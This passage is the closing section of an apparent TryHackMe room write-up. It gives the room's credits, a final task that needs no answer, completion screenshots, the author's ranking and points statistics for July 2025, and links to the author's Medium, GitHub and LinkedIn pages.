- Varg - For creating the amazing Cooctus Clan designs<br>
- NinjaJc01 - For the Overpass series, tips & help with the theme and box development<br>
- Paradox - Emotional support & box dev tips<br>
- Szymex - Hosting the modded Minecraft server</p>

<p><em>Answer the question below</em></p>

<p><code>No answer needed</code></p>


<br>
<br>


<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/dcb86922-0813-457b-ad34-160c43115463"><br>
                 <img width="1200px" src="https://github.com/user-attachments/assets/971395b2-475c-4b1d-96f5-3b00e5761a66"></p>


<br>

<h1 align="center">My TryHackMe Journey</h1>
<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 28, 2025     | 448      |     147ᵗʰ    |      5ᵗʰ     |     130ᵗʰ   |     7ᵗʰ    | 117,576  |    878    |    72     |

</div>


<p align="center">Global All Time:   151ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/cf7985d6-b6f2-4ce7-937e-684eb29fd824"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/0640787a-6aa0-418e-a736-7a0250578e73"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/c405e843-c2fd-44f9-a415-f1761983dfd1"><br>
                  Global monthly:    130ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/41286cef-e9fa-4ea2-88d3-0b33eea2b4e2"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/83da0c43-5436-465b-bd25-7caa1e48dc08"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
